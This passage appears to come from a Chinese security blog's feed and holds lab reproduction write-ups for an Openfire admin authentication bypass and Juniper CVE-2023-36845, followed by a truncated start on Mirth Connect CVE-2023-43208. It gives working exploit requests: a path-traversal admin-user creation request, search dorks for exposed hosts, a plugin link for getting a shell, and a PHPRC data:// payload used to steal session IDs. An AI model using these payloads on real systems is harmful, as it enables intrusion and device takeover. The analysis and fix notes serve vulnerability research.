        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞名称：Openfire 管理后台认证绕过漏洞复现</p><p>应用介绍：Openfire 是免费的、开源的、基于可拓展通讯和表示协议 ( XMPP )、采用Java编程语言开发的实时协作服务器。Openfire安装和使用都非常简单，并利用Web进行管理。单台服务器甚至可支持上万并发用户。</p><p>影响版本：</p><ul><li><p>3.10.0 &lt;&#x3D; Openfire &lt; 4.6.8</p></li><li><p>4.7.0 &lt;&#x3D; Openfire 4.7.x &lt; 4.7.5</p></li></ul><p>漏洞介绍：Openfire的Web管理后台存在一处目录穿越漏洞，这将允许攻击者绕过权限校验访问所有受限页面。我们可以借此漏洞未授权创建管理员用户，并结合后台自定义插件的上传，达到 RCE。</p><p>搜索语法：</p><ul><li>icon_hash&#x3D;”1211608009”</li><li>body&#x3D;”jive-loginVersion” </li><li>title&#x3D;”Openfire Admin Console”</li><li>title&#x3D;”Openfire 管理”</li><li>title&#x3D;”Openfire Console Admin”</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/igniterealtime/Openfire/releases/download/v4.7.4/openfire_4_7_4_x64.exe"><strong>https://github.com/igniterealtime/Openfire/releases/download/v4.7.4/openfire_4_7_4_x64.exe</strong></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>Openfire 管理后台曾经爆出过一次 CVE-2008-6508，该漏洞也是路径穿越漏洞，随后官方对其进行修复，修复方法为检测路径中是否有 <code>..</code> 和 <code>%2e</code> ( .. 的 url 编码 )，但由于Openfire内置的 Jetty Web 服务器升级支持对 UTF-16 ( %u002e ) 这类非标准 unicode uri 的解析，从而使路径穿越重新出现。</p><p>源码：<a href="https://github.com/igniterealtime/Openfire/releases/download/v4.7.4/openfire_4_7_4.zip">https://github.com/igniterealtime/Openfire/releases/download/v4.7.4/openfire_4_7_4.zip</a></p><p>先看 web.xml 中的过滤器：xmppserver&#x2F;src&#x2F;main&#x2F;webapp&#x2F;WEB-INF&#x2F;web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>AuthCheck<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.jivesoftware.admin.AuthCheckFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>excludes<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span><br>            login.jsp,index.jsp?logout=true,setup/index.jsp,setup/setup-*,.gif,.png,error-serverdown.jsp,loginToken.jsp<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br></code></pre></td></tr></table></figure><p>定位过滤器位置，查看器 doFilter 函数：<code>org/jivesoftware/admin/AuthCheckFilter.java</code></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/72349e28-1e9b-47db-ae62-800d4bbac1b9.png?imageSlim" alt="image"></p><p>它有一个对于 excludes的判断，就是判断 URL 是否是后台过滤器的白名单，如果是那就不进行后面匹配，跟进具体的实现：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/42617c38-4ed7-47bb-a0ed-20e3eb618c4f.png?imageSlim" alt="image"></p><p>可以看到它第一个判断中，对应有 *存在的白名单规则，截取路径部分，然后判断其中是否包含 .. 和 %2e，如果都不存在则返回 true 然后就会绕过后面的权限校验。</p><p>上面说过器内置服务器可以解析 UTF-16 这类字符，那么就可以把 ..&#x2F;换成 %u002e%u002e&#x2F; 就可以再次进行路径穿越。</p><p>那么只要使用 setup&#x2F;setup-* 加上  %u002e%u002e&#x2F;  就可以实现路径穿越。</p><p>就像这样：&#x2F;setup&#x2F;setup-s&#x2F;%u002e%u002e&#x2F;%u002e%u002e&#x2F;log.jsp</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用思路为：</p><ol><li><p>创建后台用户登录后台</p></li><li><p>上传插件 getshell</p></li></ol><p>创建后台用户：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/08b412a7-ff84-4314-aab1-98401aa074e1.png?imageSlim" alt="image"></p><pre><code class="hljs">GET /user-create.jsp?csrf=643LDwk5NJtV8JO&amp;username=demo&amp;name=&amp;email=&amp;password=demo&amp;passwordConfirm=&amp;isadmin=on&amp;create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7 HTTP/1.1Host: 127.0.0.1:9090sec-ch-ua: sec-ch-ua-mobile: ?0sec-ch-ua-platform: &quot;&quot;Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: http://127.0.0.1:9090/user-create.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=node0p140w41smlfh1vcb7ab9h9gm938.node0; csrf=643LDwk5NJtV8JOConnection: close</code></pre><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/d9c9b1dd-9b38-4be8-9fcc-58b4b6334668.png?imageSlim" alt="image"></p><p>发现还需要一个 csrf 和 JSESSIONID，这两个东西直接访问个页面就会回显：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/af421475-d13a-474a-843e-497c290cbcae.png?imageSlim" alt="image"></p><p>获取这 2 个东西后，即可创建用户。不过后面发现没有这两个也能创建用户，但是貌似不太稳定？第一次直接成功，但后面几次都失败了，还是加上稳一点。</p><p>然后上传插件：<a href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/download/v0.1/org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jar">https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/download/v0.1/org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jar</a></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/a03bceed-007b-4ace-aafa-cd94c4764689.png?imageSlim" alt="image"></p><p>密码是 123</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/da093bba-4428-4b68-9a08-86055c9f7dde.png?imageSlim" alt="image"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>看了一下过滤器，发现直接把有 *的白名单给删除了：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/423f92af-ec04-4440-b890-66aa3139b62f.png?imageSlim" alt="image"></p><p>然后 testURLPassesExclude 这里，对 URL 进行 utf-8 解码，这样就解决了上面的因为编码问题导致绕过：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/25880dd2-c93d-4128-bd18-0fffafe2091f.png?imageSlim" alt="25880dd2-c93d-4128-bd18-0fffafe2091f"></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-36845 Juniper SRX EX 远程命令执行漏洞</title>
      <link href="/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2023-36845/"/>
      <url>/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2023-36845/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞名称：CVE-2023-36845 Juniper SRX EX 远程命令执行漏洞</p><p>影响应用：瞻博网络 Junos OS 的 SRX 防火墙和 EX 交换机系列产品</p><p>漏洞介绍：Web 服务器存在环境变量注入漏洞，通过控制 PHPRC （ PHP 环境变量 ）影响 PHP 配置文件，使用配置文件中的 auto_prepend_file 进行文件包含，导致代码执行、文件泄露等危害。本漏洞和 J-Web 的代码无关，而是其使用的 Web 服务器的原因。</p><p>漏洞利用：上面虽然说到可代码执行，但 Juniper 有开发了一个 Veriexec 工具，它会限制住系统命令执行（ ls 、id 啥的有点用的都不行 ），而且 J-Web 运行在 FreeBSD Jail （ 每个 Jail 环境都有其独立的文件系统、进程空间和网络堆栈），所以说这个代码执行并不能去执行系统命令，只能够利用 PHP 代码去做一些事情。</p><p>所以该漏洞的危害是从其他方面去入手的，不过同样有限制：J-Web 的登录凭证会存储到 &#x2F;var&#x2F;sess&#x2F; 目录下 （ 别人登录后，有效 1 h ），我们可以利用 PHP 代码去获取该目录下的文件名，其文件名就是凭证值，然后在 Cookie 加入该值就可以登录 J-Web 后台，控制防火墙、交换机设备。</p><p>应用介绍：Juniper Networks Junos OS EX 是美国瞻博网络（Juniper Networks）公司的一套专用于该公司的硬件设备的网络操作系统。该操作系统提供了安全编程接口和 Junos SDK。</p><p>Juniper Networks Junos OS EX 存在安全漏洞，该漏洞源于J-Web模块存在PHP外部变量修改漏洞。允许未经身份验证的网络攻击者控制某些重要的环境变量。攻击者利用特制请求可以修改某个PHP环境变量，造成部分完整性损失，这可能允许链接到其他漏洞。</p><p>修复介绍：官方给的修复方式就是禁用 J-Web 组件，使用客户端去进行设备管理。禁用 J-Web 后虽然该漏洞仍然存在，但无法获取凭证登录后台了。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载个 ova 文件导入虚拟机中然后配置 J-Web 就可以了，官网要注册，找了一个百度云的：</p><p>链接：<a href="https://pan.baidu.com/s/14AOCwCxMWLL6ok35pcSVdQ?pwd=6ee4">https://pan.baidu.com/s/14AOCwCxMWLL6ok35pcSVdQ?pwd=6ee4</a> </p><p>进去后改下网络适配器 NAT：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/fa6d14f9-071f-4e23-b747-3f5606715764.png?imageSlim" alt="image"></p><p>安装完成后，登录 root 用户，空密码，然后去开启 J-Web：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">进入控制页面</span><br>cli<br><span class="hljs-meta prompt_"># </span><span class="language-bash">配置密码</span><br>configure<br>set system root-authentication plain-text-password<br>commit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">开启 J-Web 192.168.254.134/24 是自己机器的</span><br>set interfaces ge-0/0/1 unit 0 family inet address 192.168.254.134/24<br>set security zones security-zone trust<br>set security zones security-zone trust interfaces ge-0/0/1.0<br>set security zones security-zone trust interfaces ge-0/0/1.0 host-inbound-traffic system-services ping<br>set security zones security-zone trust interfaces ge-0/0/1.0 host-inbound-traffic system-services ssh<br>set security zones security-zone trust interfaces ge-0/0/1.0 host-inbound-traffic system-services http<br>set security zones security-zone trust interfaces ge-0/0/1.0 host-inbound-traffic system-services https<br>set system services web-management http interface ge-0/0/1.0<br>set system services web-management https system-generated-certificate<br>set system services web-management https interface ge-0/0/1.0<br>set system services ssh root-login allow<br>commit<br></code></pre></td></tr></table></figure><p>密码就是之前设置的密码。</p><p>J-Web 组件代码在 <code>/packages/mnt/jweb-srxtvp-8ae76b91/jail/html</code> 目录下。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/3e4731de-3894-4bc2-a40e-26dc2d50216f.png?imageSlim" alt="image"></p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>auto_prepend_file 是 php.ini 中的一项配置，其作用相当于 php 代码 require 或 include，这个参数表示php程序加载应用程序前加载指定的php文件。</p><p>allow_url_include 是否允许 include&#x2F;require 打开 URL 作为文件处理。</p><p>在本地先搞一下，修改 php.ini：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 文件包含, 利用 data:// 内嵌文件</span><br>auto_prepend_file = <span class="hljs-string">&quot;data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg==&quot;</span><br><span class="hljs-comment"># allow_url_include 开启导致可以利用 data:// 来内嵌文件进行无文件导致文件包含漏洞</span><br>allow_url_include = On<br></code></pre></td></tr></table></figure><p>然后在写一个用于访问的 php 文件：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/98b3f96a-dbc4-4f32-bc29-46c3ef0e134f.png?imageSlim" alt="image"></p><p>访问后就可以看到其加载了 phpinfo.php ：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/9363f3f7-cb95-481d-a261-1db7940cfb1c.png?imageSlim" alt="image"></p><p>再看一下 PHPRC 环境变量，这个环境变量是可以控制 php.ini 的，这个漏洞就是这个环境变量可控，然后导致的代码执行漏洞。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/e6422aed-b8a7-4d55-9001-7a1db7ba9261.png?imageSlim" alt="image"></p><p>这个漏洞利用原理就是这样，PHPRC 可控导致代码执行。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>关于 CVE-2023-36845 漏洞官方的介绍和修复都非常简单：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/223dba6e-ec57-48a5-a94a-52d8f0b83225.png?imageSlim" alt="image"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/854f6e1a-1d1d-429b-8c20-e54f6b9e5d69.png?imageSlim" alt="image"></p><p>……..</p><p>该应用使用的是 CGI 模式，其执行流程如下：</p><ol><li><p>客户端请求： 用户通过浏览器发送HTTP请求到Web服务器。</p></li><li><p>Web服务器检测CGI： Web服务器检查请求的URL，如果它指向一个CGI脚本，就会触发CGI处理。</p></li><li><p>环境变量设置： Web服务器为CGI脚本设置一些环境变量，这些变量包含了有关请求的信息，例如请求方法（GET或POST）、查询字符串、请求头等。</p></li><li><p>CGI脚本执行： Web服务器启动一个新的进程，运行指定的CGI脚本。脚本接收到环境变量和请求数据。</p></li><li><p>处理请求： CGI脚本根据环境变量和请求数据生成响应内容，通常是HTML页面。</p></li><li><p>响应发送： 生成的响应被发送回Web服务器。</p></li><li><p>Web服务器发送响应： Web服务器将响应发送回客户端浏览器，完成HTTP请求-响应周期。</p></li></ol><p>操作环境变量的很明显就应该是 Web 服务器这里了。</p><p>Web 服务器在 &#x2F;packages&#x2F;mnt&#x2F;jweb-srxtvp-8ae76b91&#x2F;usr&#x2F;sbin 就一个可执行文件：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/64060abd-415d-4e9d-bdf4-9b145418c2df.png?imageSlim" alt="image"></p><p>可以看到 appweb.conf ，它是基于 appweb 开发而来的，搜一下跟环境变量有关的就这个了：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/f09ca7a6-1437-450b-9d53-4c3d9c55658a.png?imageSlim" alt="image"></p><p>appweb 是 Embedthis 开发的一款嵌入式 web 服务器，Embedthis 旗下还有 GoAhead 项目，也是一个比较出名的嵌入式 web 服务器。这个项目有 CVE-2017-17562 以及 CVE-2021-42342 这两个 goahead 的环境变量注入漏洞，成因是代码在处理用户提交的参数时没有合理限制敏感字符，导致可以注入如 LD_PRELOAD 等关键环境变量。</p><p>看不到代码，也没有具体的介绍，就只能猜测该漏洞可能是 Juniper 在 Web 服务器 appweb 这里导致了环境变量注入漏洞。网上也没找到具体的说明。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这个漏洞的利用方式的有个发展过程，漏洞发布的时候评分 5.3 ，不过在和 CVE-2023-36846 组合起来利用的时候，达成 RCE 效果，组合评分 9.8。在 watchtowr 的文章中，其研究通过 CVE-2023-36846 ( 未授权文件上传漏洞 ) 上传 php 和 ini 文件，然后利用 CVE-2023-36845 修改 PHPRC指向上传的 ini 文件，从而造成文件包含代码执行。</p><p>随后 vulncheck 的 Jacob Baines 发现了一条单洞就可以代码执行的利用方式，然后评分升级了：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/17ef09c6-0498-45c1-bad1-35852e763bda.png?imageSlim" alt="image"></p><p>这个 CVE-2023-36846 是因为 do_upload 函数，也就是进行文件上传的，没有对文件上传做限制，导致可以上传文件到 &#x2F;var&#x2F;tmp&#x2F; 目录下，上传 ini 和 php 文件，然后在设置 &#x2F;?PHPRC&#x3D;&#x2F;var&#x2F;tmp&#x2F;xxx.ini，这就导致了文件包含。</p><p>而 vulncheck 发现的这种利用方式，也就是在上面那本地测试的那种，利用 data:&#x2F;&#x2F; 内嵌文件进行包含。</p><p>这里去执行一下系统命令：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1daace85-3f44-46fe-b7fb-cc3161fe8bca.png?imageSlim" alt="image"></p><p>这个就是 Veriexec 导致的了，也是因为这个东西 watchtowr 才使用了 PHPRC + ini 文件包含的利用手法，而不是使用 LD_PRELOAD 环境变量加载动态链接库进行命令执行（ CVE-2017-17562  的利用手法 ）。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/a1e567c5-9534-40d8-aa45-d341a01b0d2e.png?imageSlim" alt="image"></p><p>由于存在 Veriexec 导致不能够去进行命令执行，就只能是去找其他的利用方法：</p><p>在 &#x2F;packages&#x2F;mnt&#x2F;jweb-srxtvp-8ae76b91&#x2F;jail&#x2F;html&#x2F;core&#x2F;user.php 中，可以看到它会把 session 保存为 “$sessPath&#x2F;sess_“ . $cookie_value 并且其判断登录也是靠的这个文件是否存在。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/18fe27c6-9292-4b21-91ea-857e2cbbd88e.png?imageSlim" alt="image"></p><p>这里就是直接登录一下，在系统里面找下文件：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/e773f9f3-4985-44fd-b03a-17e977c396dc.png?imageSlim" alt="image"></p><p>&#x2F;var&#x2F;jail&#x2F;sess&#x2F;和那个目录下都有，那使用 PHP 读取该目录下的文件：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/?PHPRC=/dev/fd/0</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.254.134<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Ch-Ua</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">Sec-Ch-Ua-Mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">Sec-Ch-Ua-Platform</span><span class="hljs-punctuation">: </span>&quot;&quot;<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>122<br><br><span class="language-ini"><span class="hljs-attr">allow_url_include</span>=<span class="hljs-number">1</span></span><br><span class="language-ini"><span class="hljs-attr">auto_prepend_file</span>=<span class="hljs-string">&quot;data://text/plain;base64,PD9waHAgcHJpbnRfcihzY2FuZGlyKCcvdmFyL3Nlc3MnKSk7Pz4=&quot;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/d50e255f-0e17-4c93-8e9e-389644645553.png?imageSlim" alt="image"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/60a5d2a0-3e8b-4ffb-9b4a-8f5a46ee8fba.png?imageSlim" alt="image"></p><p>然后伪造 PHPSESSID 进行登录即可，这里要注意：</p><p>http 是 PHPSESSID，https 是 SECUREPHPSESSID：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/d9bf6c35-a9bd-4120-84e1-4dcb78ac689e.png?imageSlim" alt="image"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/e104d5c6-8617-493c-b0d5-cc291bdb0e28.png?imageSlim" alt="image"></p><p>刷新页面即可进入后台，不过这个 PHPSESSID 有效时常是 1 h，还需要对方也正在登录，没有退出的情况才有用：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/5e8663e7-208f-407c-96ef-495907287fa0.png?imageSlim" alt="image"></p><p>漏洞修复就是关闭 J-Web，访问后就类似于这种，后台无法利用：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/d0c2374c-d71e-433a-96e2-618ef02645be.png?imageSlim" alt="image"></p><p>问题出现在 web 服务器，所有就算关闭 J-Web 也同样可以利用，不过后台无法利用的话其实这个漏洞很难在往下去利用了，目前的危害就是可以执行 PHP 代码获取一些信息或者能使用 PHP 代码对内网进行探测：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/417865ac-04be-40dc-bc9b-2e7126b6d50a.png?imageSlim" alt="image"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/f29bc767-da9d-4d94-9a32-6b64fdbea130.png?imageSlim" alt="image"></p><p>MSF 中也有对该漏洞的利用：</p><p><a href="https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/freebsd/http/junos_phprc_auto_prepend_file.rb">https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/freebsd/http/junos_phprc_auto_prepend_file.rb</a></p><p>从它的 payload 路径就可以看到其归类到 freebsd 这里了。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/4ea3b038-8fae-4ed5-85cd-2fcd78ec91a9.png?imageSlim" alt="image"></p><p>它最后的利用是去依靠 FreeBSD Jail 启用逃逸模式，然后去利用 Juniper J-Web 后台的某些功能去重写真实系统上的 ssh 密码密码。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/db0d7e59-5b1a-49f3-adce-64f32166d0ee.png?imageSlim" alt="image"></p><p>不过前提就是 JAIL_BREAK 要开启，这个 Juniper 应该是不会给默认开启的：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/b70cb4f3-7c98-4752-82be-5b62c708ffab.png?imageSlim" alt="image"></p><p>找了一下，没开</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/2d363a02-3949-4419-ac4a-38617b7876dc.png?imageSlim" alt="image"></p><p>那么这个漏洞的危害就是代码执行（ 达不到执行系统命令 ）、登录后台操作设备了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><p><a href="https://vulncheck.com/blog/juniper-cve-2023-36845">https://vulncheck.com/blog/juniper-cve-2023-36845</a></p></li><li><p><a href="https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/">https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/</a></p></li><li><p><a href="https://www.rapid7.com/blog/post/2023/08/31/etr-exploitation-of-juniper-networks-srx-series-and-ex-series-devices/">https://www.rapid7.com/blog/post/2023/08/31/etr-exploitation-of-juniper-networks-srx-series-and-ex-series-devices/</a></p></li><li><p><a href="https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/freebsd/http/junos_phprc_auto_prepend_file.rb">https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/freebsd/http/junos_phprc_auto_prepend_file.rb</a></p></li><li><p><a href="https://xz.aliyun.com/t/12892">https://xz.aliyun.com/t/12892</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-43208 NextGen Mirth Connect 远程代码执行漏洞</title>
      <link href="/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2023-43208/"/>
      <url>/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2023-43208/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞名称：CVE-2023-43208 NextGen Mirth Connect 远程代码执行漏洞</p><p>漏洞编号：CVE-2023-43208</p><p>漏洞介绍：NextGen HealthCare 的 Mirth Connect 是一个被医疗保健公司广泛使用的开源数据集成平台。低于 4.4.1 的版本容易受到未经身份验证的远程代码执行漏洞 CVE-2023-43208 的影响。该漏洞是由 CVE-2023-37679 的不完整补丁引起的。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/nextgenhealthcare/connect/tags">https://github.com/nextgenhealthcare/connect/tags</a></p><p>先安装 Java 环境，这里是 Java8，然后下载对应系统的压缩包，解压后启动 mcserver 即可：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/eb5ea02a-6c7c-4366-86a5-a70b5a2fdd32.png?imageSlim" alt="image"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/e989cac4-21e1-4de6-ab99-01309fbdf919.png?imageSlim" alt="image"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这个漏洞是  CVE-2023-37679 的补丁绕过导致的漏洞，所以先找这个漏洞，该漏洞在 4.3.0 发现 4.4.0 修复：</p><p><a href="https://github.com/nextgenhealthcare/connect/compare/4.3.0...4.4.0">https://github.com/nextgenhealthcare/connect/compare/4.3.0...4.4.0</a></p><p>根据漏洞发现时间看看提交，修复应该是这里：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/de95af9b-5c73-49ab-91c5-19837c61a08e.png?imageSlim" alt="image"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/0a5e8295-48c3-4efa-9efe-47a2ff88ba3c.png?imageSlim" alt="image"></p><p>这里添加了些类似黑名单的东西，先找了下 XStream 的历史漏洞，不过发现这个 1.4.19 是没有 RCE 的，1.4.17 后就默认开启白名单了，这里漏洞成因是这个：</p><pre><code class="hljs">xstream.addPermission(AnyTypePermission.ANY);</code></pre><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/e1030512-8fb4-48c7-adca-e167c5d30c82.png?imageSlim" alt="image"></p><p>可以处理任何类型的对象，那直接找哪里调了这个反序列化的就行：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/9fa76023-2240-4b0c-96c1-14a164845e09.png?imageSlim" alt="image"></p><p>最后的利用点是找到了这里：</p><p><img 